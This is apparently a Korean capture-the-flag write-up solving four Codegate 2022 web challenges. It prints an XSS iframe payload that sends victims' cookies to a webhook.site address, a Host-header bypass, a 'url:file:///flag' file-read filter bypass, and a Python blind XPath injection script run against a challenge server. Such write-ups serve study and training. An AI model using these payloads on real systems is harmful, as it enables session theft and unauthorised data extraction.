## Web (KO)

올해 Codegate 2022에 Cykor로 참가하여 모든 웹 문제를 풀었습니다!!! (오예!)

다른 건 아니고 라이트 업을 남길까 하여 글 작성해봅니다!

### CAFE

- Unintended Solution
  
  `bot.py` 소스코드를 열어보면 어드민 비밀번호가 적혀있다. 해당 정보로 로그인하면 바로 플래그가 나온다.

- Intended Solution
  
  웹문제 다 풀고, 인텐으로도 풀어봤다.
  
   `/libs/util.php`를 보면 `filterHtml`라는 함수가 존재하는데, html 입력된거 sanitize 해주는 역할 같다. iframe쪽 보면 `parse_url`이라는 눈에 띄는 친구가 있다.
  
  ```php
          case 'iframe':
              $src = $element->src;
              $host = parse_url($src)['host'];
              if (strpos($host, 'youtube.com') !== false){
                $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
              }
              break;
  ```
  
  `parse_url`이 youtube.com을 host로 리턴해야하는 상황이고, `$src`를 iframe의 src로 설정해준다. `javascript:` 를 이용해서 `parse_url` 함수가 `youtube.com`를 host로 인식시키게 할 수 있다. `javascript://youtube.com` 이런 식으로 간단하게 우회가 가능하다. `javascript:`가 `//` 를 주석으로 인식하기 때문에, `youtube.com` 를 주석으로 브라우저에 인식 시키되, `parse_url`에서는 host로 인식시키는 것이 가능하다. 그리고 %0a를 사용하면 javascript로 다시 인식시키는 것이 가능하다.
  
  Payload:
  
  ```html
  <iframe src="javascript://youtube.com/%0alocation='https://webhook.site/29eb4b3e-db17-40a9-90e9-2097648d43b0/'%2bdocument.cookie"></iframe><iframe src="javascript://youtube.com/%0alocation='https://webhook.site/29eb4b3e-db17-40a9-90e9-2097648d43b0/'%2bdocument.cookie"></iframe>
  ```
  
  세션 릭하고 쿠키 변조해서 들어가보면 플래그가 있다.
  
  Flag: `codegate2022{4074a143396395e7196bbfd60da0d3a7739139b66543871611c4d5eb397884a9}`

### Superbee

`beego` 라는 Go언어 라이브러리를 사용하고 있다 (Flask같은 역할). 이 라이브러리가 `AutoRouter` 라는 흥미로운 기능을 제공하는데, [beedoc/router.md at master · beego/beedoc · GitHub](https://github.com/beego/beedoc/blob/master/en-US/mvc/controller/router.md#auto-matching) 에서 언급이 되어있다. 공식 문서 보면서 동작 방식 확인하고, 코드를 훑어보면 우선 AES-CBC로 암호화된 AuthKey를 릭을 해야할 듯 했다. 다만, `BaseController` 에 domain이 localhost여야 한다는 조건이 걸려있다.

```go
func (this *BaseController) Prepare() {
    controllerName, _ := this.GetControllerAndAction()
    session := this.Ctx.GetCookie(Md5("sess"))

    if controllerName == "MainController" {
        if session == "" || session != Md5(admin_id + auth_key) {
            this.Redirect("/login/login", 403)
            return
        }
    } else if controllerName == "LoginController" {
        if session != "" {
            this.Ctx.SetCookie(Md5("sess"), "")
        }
    } else if controllerName == "AdminController" {
        domain := this.Ctx.Input.Domain()

        if domain != "localhost" {
            this.Abort("Not Local")
            return
        }
    }
}
```

그냥 패킷 잡아서 `Host: localhost` 로 변조해주면 `/admin/authkey` 에 우회해서 접근 가능하다. 암호화된 auth_key는 `00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607` 였다. 그냥 AES-CBC 디크립트 해주면 된다.

```python
from Crypto.Cipher import AES

enc = bytearray.fromhex('00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607')
key = b'\x10' * 16
iv = b'\x10' * 16
enc = bytes(enc)
aes = AES.new(key, AES.MODE_CBC,iv)
p = aes.decrypt(enc)
print(p.hex())
```

`auth_key` 는 `Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d`. 이제 아래 로직에 맞게 쿠키 생성해주면 플래그를 얻을 수 있다.

```go
func (this *LoginController) Auth() {
    id := this.GetString("id")
    password := this.GetString("password")

    if id == admin_id && password == admin_pw {
        this.Ctx.SetCookie(Md5("sess"), Md5(admin_id + auth_key), 300)

        this.Ctx.WriteString("<script>alert('Login Success');location.href='/main/index';</script>")
        return
    }
    this.Ctx.WriteString("<script>alert('Login Fail');location.href='/login/login';</script>")
}
```

Flag: `codegate2022{d9adbe86f4ecc93944e77183e1dc6342}`

### babyFirst

 `MemoServlet.class`를 디컴파일하면 `lookupImg`라는 함수가 있다. 이 함수는 내가 입력한 url을 긁어오는 역할을 해준다.

```java
    private static String lookupImg(String memo) {
        Pattern pattern = Pattern.compile("(\\[[^\\]]+\\])");
        Matcher matcher = pattern.matcher(memo);
        String img = "";
        if (!matcher.find()) {
            return "";
        }
        img = matcher.group();
        String tmp = img.substring(1, img.length() - 1);
        tmp = tmp.trim().toLowerCase();
        pattern = Pattern.compile("^[a-z]+:");
        matcher = pattern.matcher(tmp);
        if (!matcher.find() || matcher.group().startsWith("file")) {
            return "";
        }
        String urlContent = "";
        try {
            final URL url = new URL(tmp);
            final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine = "";
            while ((inputLine = in.readLine()) != null) {
                urlContent = urlContent + inputLine + "\n";
            }
            in.close();
        }
        catch (Exception e) {
            return "";
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        try {
            final String encodedString = new String(encoder.encode(urlContent.getBytes("utf-8")));
            memo = memo.replace(img, "<img src='data:image/jpeg;charset=utf-8;base64," + encodedString + "'><br/>");
            return memo;
        }
        catch (Exception e2) {
            return "";
        }
    }
```

 `[link]` 이렇게 입력해주면 link를 이미지 링크로 인식하고 . `file` scheme 이용하면 플래그 내용을 긁어올 수 있을 것 같다. 그리고 정규식으로 리턴된 값이 `file` 로 시작되는지 검사하는 로직이 존재한다. 그래서 그냥 `file` 로 시작하지 않되, `file` 스킴을 사용할 수 있는 방법을 찾아봤다. 이런 저런 문서도 읽고 라이브러리도 열어보다 보니까 이런 라인이 존재했다 - [jdk11/URL.java at master · openjdk/jdk11 · GitHub](https://github.com/openjdk/jdk11/blob/master/src/java.base/share/classes/java/net/URL.java#L575 "https://github.com/openjdk/jdk11/blob/master/src/java.base/share/classes/java/net/URL.java#L575").

```java
            if (spec.regionMatches(true, start, "url:", 0, 4)) {
                start += 4;
            }
```

`URL` 클래스에서 `url:` 로 시작하면 해당 부분 이후 부터 진짜 url로 인식한다. 그래서 그냥 `file` scheme 을 `[url:file:///flag]` 이런 식으로 우회해서 사용할 수 있었다.

Flag: `codegate2022{8953bf834fdde34ae51937975c78a895863de1e1}`

### myblog

 `blogServlet.class`을 디컴파일 해보면 `doReadArticle` 이라는 XPATH Injection이 존재하는 함수를 찾을 수 있다.

```java
    private String[] doReadArticle(final HttpServletRequest req) {
        final String id = (String)req.getSession().getAttribute("id");
        final String idx = req.getParameter("idx");
        if ("null".equals(id) || idx == null) {
            return null;
        }
        final File userArticle = new File(this.tmpDir + "/article/", id + ".xml");
        try {
            final InputSource is = new InputSource(new FileInputStream(userArticle));
            final Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
            final XPath xpath = XPathFactory.newInstance().newXPath();
            String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
            String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
            title = this.decBase64(title.trim());
            content = this.decBase64(content.trim());
            return new String[] { title, content };
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
            return null;
        }
    }
```

그리고 도커파일 보면 flag가 `catalina.properties`에 정의된다는걸 알 수 있다.

```dockerfile
FROM ubuntu:20.04

RUN apt-get -y update && apt-get -y install software-properties-common

RUN apt-get install -y openjdk-11-jdk

RUN apt-get -y install wget
RUN mkdir /usr/local/tomcat
RUN wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.75/bin/apache-tomcat-8.5.75.tar.gz -O /tmp/tomcat.tar.gz
RUN cd /tmp && tar xvfz tomcat.tar.gz
RUN cp -Rv /tmp/apache-tomcat-8.5.75/* /usr/local/tomcat/
RUN rm -rf /tmp/* && rm -rf /usr/local/tomcat/webapps/

COPY src/ROOT/ /usr/local/tomcat/webapps/ROOT/

COPY start.sh /start.sh
RUN chmod +x /start.sh

RUN echo 'flag=codegate2022{md5(flag)}' >> /usr/local/tomcat/conf/catalina.properties

CMD ["/start.sh"]
```

`catalina.properties`에 대해서 찾다보면 해당 파일에서 정의된 내용은 system properties로 취급 된다는 걸 알 수 있다 ([apache - Tomcat 7 - where do I set 'system properties'? - Stack Overflow](https://stackoverflow.com/questions/9520987/tomcat-7-where-do-i-set-system-properties)). 그래서 system properties하고 관련있는 XPATH 함수들을 찾아봤다. [system-property - XPath | MDN](https://developer.mozilla.org/ko/docs/Web/XPath/Functions/system-property) 이런 친구가 존재했고 실제로 로컬 및 리모트에서 잘 작동했다. 해당 함수를 이용하면 한 글자씩 플래그를 뽑을 수 있다.

Payload:

```python
import requests
from string import ascii_lowercase, digits

SESSION = {'JSESSIONID':'72A44ADB9B62B1F392717BA9A31E06D4'}
flag = ''

for i in range(34+len('codegate2022')):
    for x in ascii_lowercase+digits+'{}':
        conn = requests.get('http://3.39.79.180/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27'+flag+x+'%27)%20and%20@idx=%271', cookies=SESSION)
        r1 = conn.text
        if 'test' in r1:
            flag += x
            print(flag)
            break
```

Flag: `codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f}`
